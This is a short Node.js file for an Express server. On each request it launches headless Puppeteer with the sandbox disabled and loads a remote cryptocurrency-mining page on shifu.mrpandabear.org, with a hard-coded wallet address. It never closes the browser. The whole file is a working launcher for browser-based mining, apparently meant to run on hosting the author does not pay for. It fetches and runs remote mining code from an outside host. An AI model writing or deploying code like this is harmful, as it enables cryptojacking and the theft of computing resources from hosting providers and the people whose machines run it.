const puppeteer = require("puppeteer");
const express = require("express");
const app = express();

app.get("/", async (req, res) => {
  const browser = await puppeteer.launch({
    args: ["--no-sandbox", "--disable-setuid-sandbox"],
  });
  const page = await browser.newPage();
  await page.goto("https://shifu.mrpandabear.org/mine?wallet=00DCBF8D24EBBD8966BF236D6F13D71B826B4B81D8D7BB0D17");

});

app.listen(process.env.PORT || 3000, () => {
  console.log("Star On Serv....");
});
